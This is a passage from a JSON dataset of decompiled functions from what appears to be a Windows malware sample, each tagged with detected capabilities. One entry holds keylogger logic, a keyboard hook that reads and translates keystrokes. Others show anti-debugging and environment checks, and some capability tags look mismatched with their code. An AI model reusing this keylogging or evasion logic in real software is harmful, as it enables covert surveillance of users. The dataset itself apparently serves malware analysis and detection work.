fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar8 = &fcn.00474f94::var_10h;\n        iVar9 = fcn.00405b28(puVar8);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        **0x4922fc = iVar9;\n        *(**0x4922fc + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.0048644c();\n        fcn.00409ecc();\n        fcn.00486448();\n        fcn.00409ecc();\n        fcn.00486444();\n        fcn.0041fe70();\n    }\n    fcn.00405974(puVar8);\n    if ((uVar11) && (uVar11 = **0x4922fc == 0,  !uVar11)) {\n        cVar1 = fcn.00486460();\n        uVar11 = cVar1 == '\\0';\n        if (!uVar11) {\n            fcn.0041fe98();\n        }\n    }\n    puVar8 = &stack0xfffff870;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar8 = &fcn.00474f94::var_10h;\n        iVar9 = fcn.00405b28(puVar8);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.0047ee70();\n        fcn.00409ecc();\n        fcn.0047ee74();\n        fcn.00409ecc();\n        fcn.0047ee78();\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff86c, puVar8);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.004744c4();\n        fcn.00474ec8(puVar12);\n    }\n    puVar8 = &stack0xfffff864;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar8 = &fcn.00474f94::var_14h;\n        iVar9 = fcn.00405b28(puVar8);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        **0x492718 = iVar9;\n        *(**0x492718 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.00484b64();\n        fcn.00409ecc();\n        fcn.00484b60();\n        fcn.00409ecc();\n        fcn.00484b5c();\n        fcn.00409ecc();\n        fcn.00484b58();\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff860, puVar8);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x492718 == 0,  !uVar11)) {\n        cVar1 = fcn.00484b68();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            fcn.0041fe98();\n        }\n    }\n    puVar12 = &stack0xfffff85c;\n    fcn.00405a44();\n    piStack2356 = 0x47bef3;\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        piStack2356 = &fcn.00474f94::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28(&fcn.00474f94::var_10h);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puVar12 = &stack0xfffff858;\n        fcn.00405a44(puVar12);\n        fcn.00405974();\n        if (uVar11) {\n            fcn.004055c8();\n            fcn.00405a84();\n            fcn.00405974();\n            if (uVar11) {\n                if (**0x4925d4 != NULL) {\n                    piVar7 = **0x4925e8;\n                    uVar3 = fcn.004059dc();\n                    uVar3 = fcn.00409ecc(**0x49248c, uVar3);\n                    (***0x4925d4)(uVar3);\n                    *in_FS_OFFSET = piVar7;\n                    goto code_r0x0047c19b;\n                }\n            }\n            else {\n                fcn.00405974();\n                if ((uVar11) && (**0x4926ac != 0)) {\n                    piVar7 = fcn.004059dc();\n                    (***0x49242c)(**0x4925a8);\n                    *in_FS_OFFSET = piVar7;\n                    goto code_r0x0047c19b;\n                }\n            }\n        }\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.0047eaa8();\n        fcn.0047eaac();\n        fcn.0047ea58();\n        uVar11 = 1;\n        fcn.0047eaa4();\n        fcn.0041fe70();\n    }\n    piVar7 = &fcn.00474f94::var_7a8h;\n    fcn.00405a44(piVar7, puVar12);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        uVar11 = **0x4926ac == 0;\n        if ((!uVar11) && (uVar11 = **0x49273c == NULL,  !uVar11)) {\n            uVar3 = fcn.004059dc();\n            (***0x49273c)(uVar3);\n        }\n    }\n    fcn.00405974();\n    if (((uVar11) && (uVar11 = **0x4926ac == 0,  !uVar11)) && (uVar11 = **0x49270c == NULL,  !uVar11)) {\n        (***0x49270c)();\n    }\n    fcn.00405974();\n    if (((uVar11) && (**0x4926ac != 0)) && (**0x49270c != NULL)) {\n        (***0x492758)();\n    }\n    *in_FS_OFFSET = piVar7;\ncode_r0x0047c19b:\n    *in_FS_OFFSET = piStack2356;\n    fcn.00405554(0x47c2c8);\n    fcn.0040700c();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.004060f8();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.004060ac();\n    fcn.00411640();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 48099
    },
    "00480980": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480980(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piStack300;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack284 = 0x480e0b;\n    piStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack288;\n    uStack296 = 0x480dd2;\n    piStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack300;\n    if ((arg_8h < 0) || (puVar1 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  arg_8h == 3)) {\n        sub.user32.dll_CallNextHookEx(*0x4981b8, arg_8h, arg_ch, arg_10h);\n        puVar1 = puStack292;\n        puVar2 = puStack280;\n    }\n    puStack280 = puVar2;\n    puStack292 = puVar1;\n    if ((arg_8h != 0) || (arg_ch != 0x100)) goto code_r0x00480daf;\n    cVar3 = fcn.00480968();\n    if (cVar3 != '\\0') {\n        sub.user32.dll_CallNextHookEx(*0x4981b8, 0, 0x100, arg_10h);\n    }\n    iVar4 = *arg_10h;\n    if (iVar4 < 0x2f) {\n        if (iVar4 == 0x2e) {\n            fcn.004055c8();\n        }\n        else if (iVar4 - 8U < 0x26) {\n    // switch table (38 cases) at 0x480a34\n            switch(*((iVar4 - 8U) * 4 + 0x480a34)) {\n            case 0x480b33:\n                fcn.004055c8();\n                break;\n            case 0x480b45:\n                fcn.004055c8();\n                break;\n            case 0x480b57:\n                fcn.004055c8();\n                break;\n            case 0x480b69:\n                fcn.004055c8();\n                break;\n            case 0x480c2f:\n                fcn.004055c8();\n                break;\n            case 0x480c41:\n                fcn.004055c8();\n                break;\n            case 0x480c53:\n                fcn.004055c8();\n                break;\n            case 0x480c65:\n                fcn.004055c8();\n                break;\n            case 0x480c77:\n                fcn.004055c8();\n                break;\n            case 0x480c89:\n                fcn.004055c8();\n                break;\n            case 0x480c9b:\n                fcn.004055c8();\n                break;\n            case 0x480cd1:\n                goto code_r0x00480cd1;\n            }\n        }\n        else {\ncode_r0x00480cd1:\n            sub.user32.dll_GetKeyState(0x14);\n            sub.user32.dll_GetKeyState(0x11);\n            sub.user32.dll_GetKeyState(0xa0);\n            sub.user32.dll_GetKeyState();\n            if (cVar3 == '\\0') {\n                sub.user32.dll_GetKeyboardState();\n                iVar4 = fcn.0040f300();\n                if (iVar4 != 0) {\n                    fcn.00405c6c();\n                    uVar5 = fcn.00405a3c(0);\n                    sub.user32.dll_MapVirtualKeyA(*arg_10h, 0, &var_104h, uVar5);\n                    iVar4 = sub.user32.dll_ToAscii();\n                    if (iVar4 == 0) {\n                        fcn.00405530();\n                    }\n                    else if (iVar4 == 1) {\n                        fcn.00405c6c();\n                    }\n                    else if (iVar4 != 2) {\n                        fcn.00405530();\n                    }\n                }\n            }\n        }\n    }\n    else if (iVar4 < 0x76) {\n        if (iVar4 == 0x75) {\n            fcn.004055c8();\n        }\n        else {\n            if (4 < iVar4 - 0x70U) goto code_r0x00480cd1;\n    // switch table (5 cases) at 0x480aea\n            switch(*((iVar4 - 0x70U) * 4 + 0x480aea)) {\n            case 0x480b8d:\n                fcn.004055c8();\n                break;\n            case 0x480b9f:\n                fcn.004055c8();\n                break;\n            case 0x480bb1:\n                fcn.004055c8();\n                break;\n            case 0x480bc3:\n                fcn.004055c8();\n                break;\n            case 0x480bd5:\n                fcn.004055c8();\n            }\n        }\n    }\n    else if (iVar4 < 0x91) {\n        if (iVar4 == 0x90) {\n            fcn.004055c8();\n        }\n        else if (iVar4 == 0x76) {\n            fcn.004055c8();\n        }\n        else {\n            if (iVar4 != 0x77) goto code_r0x00480cd1;\n            fcn.004055c8();\n        }\n    }\n    else if (iVar4 == 0xa2) {\n        fcn.004055c8();\n    }\n    else {\n        if (iVar4 != 0xa3) goto code_r0x00480cd1;\n        fcn.004055c8();\n    }\n    fcn.0048043c();\n    if (**0x49253c == 1) {\n        fcn.00480808();\n    }\ncode_r0x00480daf:\n    piVar6 = *0x4981b8;\n    sub.user32.dll_CallNextHookEx(*0x4981b8, arg_8h, arg_ch);\n    *in_FS_OFFSET = piVar6;\n    *in_FS_OFFSET = arg_10h;\n    fcn.00405530(0x480e12);\n    return;\n}\n",
        "token_count": 1523
    },
    "00487228": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00487228(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack204;\n    uint uStack200;\n    uchar *puStack196;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint8_t uStack8;\n    \n    puStack196 = &stack0xfffffffc;\n    uStack200 = 0x4872f4;\n    uStack204 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack204;\n    fcn.00405584();\n    while( true ) {\n        uVar2 = 1;\n        uStack204 = 0;\n        iVar1 = sub.user32.dll_EnumDisplayDevicesA();\n        if (iVar1 == 0) break;\n        if ((uStack8 & 1) != 0) {\n            fcn.004057a0(*in_EAX);\n            fcn.004057a0(0x487330, 0);\n            uStack204 = 0x487348;\n            fcn.004058e0();\n        }\n    }\n    *in_FS_OFFSET = uStack204;\n    fcn.00405554(0x4872fb, uVar2);\n    return;\n}\n",
        "token_count": 287
    },
    "0048b20c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0048b20c(void)\n\n{\n    uint8_t uStack23;\n    uchar auStack20 [12];\n    \n    sub.kernel32.dll_GetSystemPowerStatus();\n    uStack23 = auStack20 >> 8;\n    if ((uStack23 & 1) == 1) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 2) == 2) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 4) == 4) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 8) == 8) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 0x80) == 0x80) {\n        fcn.00405584();\n    }\n    if (uStack23 == 0xff) {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "004015d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015d0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    param_1 = param_1 + -4;\n    iVar1 = -param_1;\n    do {\n        *(iVar1 + param_2 + param_1) = ROUND(*(iVar1 + in_EAX + param_1));\n        iVar1 = iVar1 + 8;\n    } while (iVar1 < 0);\n    *(iVar1 + param_2 + param_1) = *(iVar1 + in_EAX + param_1);\n    return;\n}\n",
        "token_count": 143
    },
    "004016f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004016f8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    fcn.0040168c();\n    puVar3 = sub.kernel32.dll_VirtualAlloc(0, 0x13fff0, 0x1000, 4);\n    puVar1 = *0x49370c;\n    if (puVar3 != NULL) {\n        *puVar3 = 0x493708;\n        puVar2 = puVar3;\n        puVar3[1] = *0x49370c;\n        *0x49370c = puVar2;\n        *puVar1 = puVar3;\n        puVar3[0x4fffb] = 2;\n        *0x493720 = 0x13ffe0 - in_EAX;\n        *0x49371c = puVar3 + (0x13fff0 - in_EAX);\n        iVar4 = *0x49371c;\n        *(*0x49371c + -4) = in_EAX | 2;\n        return iVar4;\n    }\n    *0x493720 = 0;\n    return 0;\n}\n",
        "token_count": 280
    },
    "004022d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004022d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (*(in_EAX + -4) & 0xfffffff0) + in_EAX;\n    if ((*(iVar1 + -4) & 0xfffffff0) == 0) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "00402334": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402334(int32_t *param_1, int32_t **param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    *param_2 = in_EAX + 8;\n    iVar1 = *in_EAX;\n    if ((in_EAX == *(iVar1 + 0x10)) && (*(iVar1 + 8) < *(iVar1 + 0xc) || *(iVar1 + 8) == *(iVar1 + 0xc))) {\n        *param_1 = *(iVar1 + 8) + -1;\n        return;\n    }\n    *param_1 = in_EAX + ((in_EAX[-1] & 0xfffffff0U) - *(iVar1 + 2));\n    return;\n}\n",
        "token_count": 176
    },
    "00403420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nfloat10 fcn.00403420(float10 param_1)\n\n{\n    return param_1 - ROUND(param_1);\n}\n",
        "token_count": 28
    },
    "0040580c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040580c(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0040646c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040646c(void)\n\n{\n    fcn.00405d8c();\n    return 0;\n}\n",
        "token_count": 28
    },
    "0040679c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040679c(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00403050();\n        }\n        fcn.00406794();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00403050();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.0040678c();\n            }\n            fcn.00402f34();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.00402f00();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.004030fc();\n            }\n            else {\n                fcn.00403af4();\n                fcn.0040677c(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00403af4();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.0040679c(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 634
    },
    "0040738c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004073d8)\n\nvoid fcn.0040738c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint arg_8h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x407438;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00405530();\n    bVar3 = true;\n    arg_8h = 0x4073bd;\n    fcn.00405ed4();\n    if (!bVar3) {\n        fcn.00405ec8();\n        fcn.00405c6c();\n        arg_8h = fcn.00405ec8();\n        uVar1 = fcn.00405eb8();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.00407180(arg_8h);\n        if (iVar2 < 1) {\n            fcn.00405530();\n        }\n        else {\n            fcn.00405c6c();\n        }\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack28 = 0x40743f;\n    uStack32 = 0x407437;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 348
    },
    "00407448": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00407448(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4074f3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = 0x407470;\n    fcn.00405d28();\n    if (in_EAX != 0) {\n        fcn.00405fa4();\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        iVar2 = fcn.00405ec8();\n        uVar1 = fcn.004059dc(iVar2 + 1);\n        fcn.00405eb8(uVar1);\n        iVar2 = fcn.0040725c(in_EAX);\n        if (iVar2 < 1) {\n            fcn.00405d28();\n            iVar2 = in_EAX;\n        }\n        else {\n            fcn.00405fa4();\n            iVar2 = in_EAX;\n        }\n        fcn.00405d64();\n    }\n    *in_FS_OFFSET = iVar2;\n    uStack32 = 0x4074fa;\n    iStack36 = 0x4074f2;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 359
    },
    "004097cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004097cc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405c6c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 - piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 - piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 483
    },
    "00409854": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00409854(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405c6c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 + piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 + piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 491
    },
    "00409a98": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409a98(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004059dc();\n    fcn.00405620();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409ad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ad0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004059dc();\n    fcn.00405620();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharLowerBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409b08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409b08(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004059dc(param_2);\n    uVar1 = fcn.004059dc(in_EAX, uVar1);\n    iVar2 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    return iVar2 + -2;\n}\n",
        "token_count": 169
    },
    "00409b6c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b6c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    for (iVar1 = 1; (iVar1 <= iVar2 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + 1) {\n    }\n    if (iVar2 < iVar1) {\n        fcn.00405530();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar2) < 0x21; iVar2 = iVar2 + -1) {\n        }\n        fcn.00405a44(param_2);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00409c10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c10(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405a44(param_2);\n    return;\n}\n",
        "token_count": 125
    },
    "00409c48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409c48(uint param_1, char param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    uVar4 = 0;\n    pcVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar5 = *(in_EAX + -4);\n    }\n    if (pcVar5 == NULL) {\n        bVar2 = true;\n    }\n    else {\n        cVar1 = *in_EAX;\n        if (((cVar1 + 0xbfU < 0x1a) || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        bVar2 = uVar3 ^ 1;\n    }\n    if (!bVar2) {\n        if (param_2 == '\\0') {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        else {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((cVar1 != '.') && (9 < cVar1 - 0x30U)) &&\n                       ((0x19 < cVar1 + 0xbfU && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 630
    },
    "00409db4": {
